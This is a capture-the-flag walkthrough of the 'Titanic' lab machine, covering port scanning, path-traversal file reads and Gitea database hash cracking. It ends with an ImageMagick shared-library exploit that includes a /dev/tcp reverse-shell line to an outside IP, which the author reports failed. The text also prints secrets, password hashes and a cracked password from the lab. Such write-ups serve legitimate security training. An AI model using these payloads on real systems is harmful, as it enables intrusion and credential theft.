# Titanic

## Ports Scan

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.55 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 14:38 CET
Nmap scan report for 10.10.11.55
Host is up (0.037s latency).
Not shown: 59258 closed tcp ports (reset), 6275 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.91 seconds
```



## Web Enumeration

If we put the URL `http://10.10.11.55` in browser searchbar, we'll be redirected to `http://titanic.htb`&#x20;

Modify the hosts file to view the webpage

```bash
nano /etc/hosts
10.10.11.55    titanic.htb
```

Now we can see the page.

IMG

Then let's intercept the request to book a trip and follow the redirect of the page with Burp Suite.

<figure><img src="../../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

&#x20;The result of the page depends on the file declared in the URL variable called "ticket".

Try to do LFI web vulnerability in the variable "ticket"

<figure><img src="../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

We have found LFI vulnerability in the website.

Try to read `/etc/hosts` file to discover other subdomain.

```bash
curl 'http://titanic.htb/download?ticket=../../../../../../../../etc/hosts'

127.0.0.1 localhost titanic.htb dev.titanic.htb
```

Add the subdomain `dev.titanic.htb` to our local hosts file and search it in the browser

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

We are in the local git, search some code with credentials or configurations.

The `docker-compose.yml` contain mysql password

{% code title=" docker-config /mysql/docker-compose.yml" %}
```docker
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```
{% endcode %}

### Users Found in Git

We can register in the git web platform and view the other users.

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
users discovered:

developer

root
{% endhint %}

### Gitea Configuration Discovery

If we look closely in the git repository, we can find the docker-compose of gitea where there is the full path to the configuration file.

<figure><img src="../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

Exploiting the LFI web vulnerability in the main website we can get the contain of the config file.

{% code overflow="wrap" %}
```bash
curl 'http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/conf/app.ini'

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[..snip..]

[lfs]
PATH = /data/git/lfs

[..snip..]

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```
{% endcode %}

We have a path to gitea.db (`/data/gitea/gitea.db`). Copying the URL into browser to download it.

<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Read the file with `sqlite3` tool.

```bash
sqlite3 gitea.db
```

Read the db tables

```bash
> .tables

[..snip..]
user
[..snip..]
```

Get informations from user table with a simple SQL query

{% code overflow="wrap" %}
```bash
> SELECT name, full_name, email, passwd, passwd_hash_algo, login_name, salt FROM user;

administrator||root@titanic.htb|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50||2d149e5fbd1b20cf31db3e3c6a28fc9b

developer||developer@titanic.htb|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50||8bf3e3452b78544f8bee9400d6936d34
```
{% endcode %}

{% hint style="success" %}
**administrator user info**:

* Name: administrator
* Email: root@titanic.htb
* Password: cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
* Algo: pbkdf2
* Salt: 2d149e5fbd1b20cf31db3e3c6a28fc9b
{% endhint %}

{% hint style="success" %}
**developer user info**:

* Name: developer
* Email: developer@titanic.htb
* Password: e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
* Algo: pbkdf2
* Salt: 8bf3e3452b78544f8bee9400d6936d34
{% endhint %}

### Crack the pass found

Follow this section to understand the hashcat script:

[#gitea2hashcat](../../../tools/tools/crackthecode/hashcat.md#gitea2hashcat "mention")

{% code overflow="wrap" %}
```bash
python3 gitea2hashcat.py gitea.db

administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=

developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```
{% endcode %}

copy the output in a file and try to crack them with hashcat

{% code overflow="wrap" %}
```bash
hashcat -m 10900 hashs /usr/share/wordlists/rockyou.txt

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```
{% endcode %}

The developer user password has been cracked. Now we can access through SSH as developer.

```bash
ssh developer@titanic.htb
```

### User Flag

Once we are login into machine, we can print the user flag

```bash
cat user.txt
```

## Privilege Escalation

Searching interesting file or directory, i have found a juicy bash script in the /opt dir.&#x20;

```bash
ls -la /opt/scripts

-rwxr-xr-x 1 root root  167 Feb  3 17:11 identify_images.sh
```

```bash
nano /opt/scripts/identify_images.sh
```

{% code title="identify_images.sh" overflow="wrap" lineNumbers="true" %}
```bash
cd /opt/app/static/assets/images # change dir
truncate -s 0 metadata.log # clear the file metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log # find the file .jpg in a dir and then run magick with identify function
```
{% endcode %}

Check the magick version

```bash
magick -version

Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713
```

Googling on internet i have found a exploit for exactly ImageMagick version that allow us to execute remote code.

### ImageMagick - Arbitraty Code Execution



{% embed url="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" %}

POC

Go in the directory where magick will execute.

```bash
cd /opt/app/static/assets/images/
```

Set a shared librery with malicious code or reverse shell

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("sh -i >& /dev/tcp/10.10.14.147/9009 0>&1");
    exit(0);
}
EOF
```

then, set a listener port for reverse shell and wait that the script run as root user.

```bash
cat /opt/app/static/assets/images/metadata.log
```

The rev shell don't work. And i dont know why.





